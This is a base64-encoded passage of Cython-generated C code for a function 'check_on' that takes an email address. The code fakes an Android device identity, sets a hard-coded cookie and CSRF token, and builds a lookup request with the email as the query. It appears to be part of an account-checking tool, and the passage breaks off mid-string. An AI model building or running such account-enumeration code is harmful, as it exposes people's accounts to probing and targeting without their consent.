UNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAzNjUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJjaGVja19vbiIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzY1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJjaGVja19vbiIsIDEsIDEsIDEsIGkpOyBfX1BZWF9FUlIoMCwgMzY1LCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDM2NSwgX19weXhfTDNfZXJyb3IpXG4gICAgfVxuICAgIF9fcHl4X3ZfZW1haWwgPSB2YWx1ZXNbMF07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJjaGVja19vbiIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDM2NSwgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcS5jaGVja19vbiIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIE5VTEw7XG4gIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJqcV8xNGNoZWNrX29uKF9fcHl4X3NlbGYsIF9fcHl4X3ZfZW1haWwpO1xuXG4gIFxuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yanFfMTRjaGVja19vbihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9lbWFpbCkge1xuICBQeU9iamVjdCAqX19weXhfdl91YSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2RldiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2RldmljZV9pZCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3V1aSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9kYXRhID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzcG9uc2UgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90XzQ7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzggPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTAgPSBOVUxMO1xuICBpbnQgX19weXhfdF8xMTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiY2hlY2tfb24iLCAwKTtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5lcmF0ZV91c2VyX2FnZW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzY3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fcHl4X3RfNCA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMykpKSB7XG4gICAgX19weXhfdF8yID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8zKTtcbiAgICBhc3NlcnQoX19weXhfdF8yKTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzMsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19weXhfdF80ID0gMDtcbiAgfVxuICAjZW5kaWZcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIE5VTEx9O1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMywgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMS1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzY3LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgfVxuICBfX3B5eF92X3VhID0gX19weXhfdF8xO1xuICBfX3B5eF90XzEgPSAwO1xuXG4gIFxuICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hbmRyb2lkKTtcbiAgX19weXhfdl9kZXYgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FuZHJvaWQ7XG5cbiAgXG4gIF9fcHl4X3RfNSA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGFzaGxpYik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21kNSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgX19weXhfdF84ID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMzY5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3V1aWQ0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gIF9fcHl4X3RfNCA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTApKSkge1xuICAgIF9fcHl4X3RfOCA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTApO1xuICAgIGFzc2VydChfX3B5eF90XzgpO1xuICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xMCk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzEwLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fcHl4X3RfNCA9IDA7XG4gIH1cbiAgI2VuZGlmXG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF84LCBOVUxMfTtcbiAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgxLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gIH1cbiAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gIF9fcHl4X3RfNiA9IFB5VW5pY29kZV9Bc0VuY29kZWRTdHJpbmcoKChQeU9iamVjdCopX19weXhfdF8xMCksIE5VTEwsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzNjksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgX19weXhfdF80ID0gMTtcbiAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHtcbiAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzcpO1xuICAgIGFzc2VydChfX3B5eF90XzUpO1xuICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX3B5eF90XzQgPSAwO1xuICB9XG4gICNlbmRpZlxuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfdF82fTtcbiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIH1cbiAgX19weXhfdF8zID0gX19weXhfdF8yO1xuICBfX1B5eF9JTkNSRUYoX19weXhfdF8zKTtcbiAgX19weXhfdF80ID0gMDtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzMsIE5VTEx9O1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZXhkaWdlc3QsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDEtX19weXhfdF80KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNjksIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0dldFNsaWNlKF9fcHl4X3RfMSwgMCwgMTYsIE5VTEwsIE5VTEwsICZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9zbGljZVswXSwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgX19weXhfdF8xID0gUHlOdW1iZXJfQWRkKF9fcHl4X3ZfZGV2LCBfX3B5eF90XzIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNjksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gIF9fcHl4X3ZfZGV2aWNlX2lkID0gX19weXhfdF8xO1xuICBfX3B5eF90XzEgPSAwO1xuXG4gIFxuICBfX3B5eF90XzIgPSBOVUxMO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3V1aWQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzNzAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkNCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM3MCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgX19weXhfdF80ID0gMTtcbiAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHtcbiAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzcpO1xuICAgIGFzc2VydChfX3B5eF90XzIpO1xuICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX3B5eF90XzQgPSAwO1xuICB9XG4gICNlbmRpZlxuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgTlVMTH07XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgxLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNzAsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzcwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBfX3B5eF92X3V1aSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7XG4gIF9fcHl4X3RfNyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfNyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzcyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfVXNlcl9BZ2VudCwgX19weXhfdl91YSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNzIsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ29va2llLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X21pZF9aVmZHdmdBQkFBR29RcWE3QVkzbWdvWUJWMW5QKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM3MiwgX19weXhfTDFfZXJyb3IpXG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQ29udGVudF9UeXBlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlXzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzcyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfdl9oZWFkZXJzID0gKChQeU9iamVjdCopX19weXhfdF83KTtcbiAgX19weXhfdF83ID0gMDtcblxuICBcbiAgX19weXhfdF83ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNzcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzc3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZHVtcHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzNzcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCg1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzc4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jc3JmdG9rZW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmopIDwgKDApKSBfX1BZWF9FUlIoMCwgMzc4LCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FkaWQsIF9fcHl4X3ZfdXVpKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM3OCwgX19weXhfTDFfZXJyb3IpXG5cbiAgXG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ndWlkLCBfX3B5eF92X3V1aSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNzgsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGV2aWNlX2lkLCBfX3B5eF92X2RldmljZV9pZCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNzgsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcXVlcnksIF9fcHl4X3ZfZW1haWwpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzc4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfdF80ID0gMTtcbiAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHtcbiAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzYpO1xuICAgIGFzc2VydChfX3B5eF90XzIpO1xuICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX3B5eF90XzQgPSAwO1xuICB9XG4gICNlbmRpZlxuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfdF8zfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM3NywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIH1cblxuICBcbiAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9f